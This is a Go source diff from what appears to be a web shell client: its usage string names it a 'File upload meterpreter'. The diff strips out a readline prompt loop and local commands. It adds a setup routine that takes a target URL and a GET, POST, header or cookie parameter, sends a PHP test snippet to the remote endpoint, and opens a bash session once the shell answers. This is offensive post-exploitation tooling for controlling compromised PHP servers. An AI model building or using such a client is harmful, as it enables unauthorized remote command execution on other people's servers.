@@ -5,58 +5,23 @@ import (
 	"fuzzer"
 	"fuzzer/src/bash"
 	"fuzzer/src/common"
-	"io"
-	"log"
-	"strings"
 	"time"
 
-	"github.com/chzyer/readline"
 	"github.com/urfave/cli"
 )
 
 type MainInterface struct {
-	cmd         *cli.App
-	completer   *readline.PrefixCompleter
-	commands    []cli.Command
-	isConnected bool
-	running     bool
-	readline    *readline.Instance
+	cmd *cli.App
 }
 
 func CreateMainApp() *MainInterface {
-	c := MainInterface{}
-	c._buildCommand()
-	c._buildCompleter()
-	c._buildPrompt()
-	c.cmd = _createCli(&c.commands)
+	main := MainInterface{}
+	commands := _getCommands(&main)
+	app := _createCli(&commands)
 
-	return &c
-}
+	main.cmd = app
 
-func (main *MainInterface) _buildCompleter() {
-	main.completer = readline.NewPrefixCompleter()
-	lgt := len(main.commands)
-
-	for i := 0; i < lgt; i++ {
-		child := readline.PcItem(main.commands[i].Name)
-		main._buildChild(&main.commands[i].Subcommands, child)
-
-		main.completer.SetChildren(append(main.completer.GetChildren(), child))
-	}
-}
-
-func (main *MainInterface) _buildChild(sub *cli.Commands, parent *readline.PrefixCompleter) {
-	childLgt := len(*sub)
-
-	for x := 0; x < childLgt; x++ {
-		child := readline.PcItem((*sub)[x].Name)
-		parent.SetChildren(append(parent.GetChildren(), child))
-
-		subChild := (*sub)[x].Subcommands
-		if len(subChild) > 0 {
-			main._buildChild(&subChild, child)
-		}
-	}
+	return &main
 }
 
 func _addInformation(app *cli.App) {
@@ -73,22 +38,6 @@ func _addInformation(app *cli.App) {
 	app.Usage = "File upload meterpreter"
 }
 
-func (main *MainInterface) _buildPrompt() {
-	l, err := readline.NewEx(&readline.Config{
-		Prompt:          "\033[31m•\033[0m\033[31m»\033[0m ",
-		HistoryFile:     "/tmp/readline.tmp",
-		AutoComplete:    main.completer,
-		InterruptPrompt: "^C",
-		EOFPrompt:       "exit",
-	})
-
-	if err != nil {
-		panic(err)
-	}
-
-	main.readline = l
-}
-
 func _createCli(commands *[]cli.Command) *cli.App {
 	client := cli.NewApp()
 	client.Commands = *commands
@@ -99,34 +48,6 @@ func _createCli(commands *[]cli.Command) *cli.App {
 	_addInformation(client)
 
 	return client
-}
-
-func (main *MainInterface) GetCommand(line string) []string {
-	line = strings.TrimSpace(line)
-	appName := []string{"Fuzzer"}
-	args := strings.Fields(line)
-	command := append(appName, args...)
-
-	return command
-}
-
-func (main *MainInterface) loop() {
-	defer main.readline.Close()
-	log.SetOutput(main.readline.Stderr())
-
-	for main.IsRunning() {
-		line, err := main.readline.Readline()
-		if err == readline.ErrInterrupt || err == io.EOF {
-			return
-		}
-
-		if len(line) == 0 {
-			continue
-		}
-
-		command := main.GetCommand(line)
-		main.Run(command)
-	}
 }
 
 func (main *MainInterface) Run(command []string) {
@@ -141,52 +62,65 @@ func (main *MainInterface) Generate(c *cli.Context) {
 	fmt.Println("generate")
 }
 
-func (main *MainInterface) Exit(c *cli.Context) {
-	main.running = false
-}
-
-func (main *MainInterface) Start() {
-	main.running = true
-	main.loop()
-}
-
-func (main *MainInterface) Stop() {
-	main.running = false
-}
-
-func (main *MainInterface) IsRunning() bool {
-	return main.running
-}
-
-func (main *MainInterface) Encode(c *cli.Context) {
-	str := c.Args().Get(0)
-	sEnc := fuzzer.Encode(str)
-	fmt.Println(sEnc)
-}
-
-func (main *MainInterface) Decode(c *cli.Context) {
-	str := c.Args().Get(0)
-	sDec := fuzzer.Decode(str)
-	fmt.Println(sDec)
-}
-
 func (main *MainInterface) StartBash(c *cli.Context) {
 	bsh := bash.CreateBashApp()
 	bsh.Start()
 }
 
-func (main *MainInterface) SetPrompt(str string) {
-	main.readline.SetPrompt(str)
-}
-
-func (main *MainInterface) Sys(c *cli.Context) {
-	arr := c.Args()
-
-	if !arr.Present() {
+func (main *MainInterface) Start(c *cli.Context) {
+	connect := main.ServerSetup(c)
+	if !connect {
 		return
 	}
 
-	full := strings.Join(arr, " ")
+	main.StartBash(c)
+}
 
-	common.Syscall(full)
+func (main *MainInterface) ServerSetup(c *cli.Context) bool {
+	srv := &fuzzer.NET
+
+	url := c.String("u")
+	method := c.Int("m")
+	parameter := c.String("p")
+	crypt := false
+
+	if url == "" {
+		fmt.Println("Flag -u (url) is required")
+		return false
+	}
+
+	if method > 3 {
+		fmt.Println("Method is between 0 (default) and 3. [0 => GET, 1 => POST, 2 => HEADER, 3 => COOKIE]")
+		return false
+	}
+
+	if parameter == "" {
+		parameter = srv.GetParameter()
+	}
+
+	srv.SetConfig(url, method, parameter, crypt)
+
+	return main.SendTest(c)
+}
+
+func (main *MainInterface) SendTest(c *cli.Context) bool {
+	t := fuzzer.PHP.Raw("$r=1;")
+	result, err := common.Process(t)
+
+	if err != nil {
+		err.Error()
+		return false
+	}
+
+	result = fuzzer.Decode(result)
+
+	if result != "1" {
+		fmt.Println("An error occured with the host")
+		fmt.Println(result)
+
+		return false
+	}
+
+	fmt.Println("Connected")
+	return true
 }
